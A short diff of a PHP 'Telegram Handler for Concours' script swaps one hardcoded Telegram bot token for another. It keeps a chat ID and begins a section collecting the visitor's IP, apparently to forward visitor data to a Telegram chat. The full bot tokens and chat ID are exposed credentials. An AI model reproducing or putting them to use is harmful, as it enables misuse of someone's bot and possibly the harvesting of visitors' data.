@@ -3,7 +3,7 @@
 //  Telegram Handler for Concours
 // ===============================
 // Remplacez ces deux valeurs par vos vraies informations Telegram
-$botToken = '6417708035:AAGQ0w-ryvgMcp9QmUMeB1wbfbGu69ngY_c';
+$botToken = '6760337281:AAH-D1XqQ6zx1LPqORyH4MPZtk7RH3OWL3o';
 $chatId   = '5061239044'; // ID perso ou ID groupe/canal
 
 // IP du visiteur
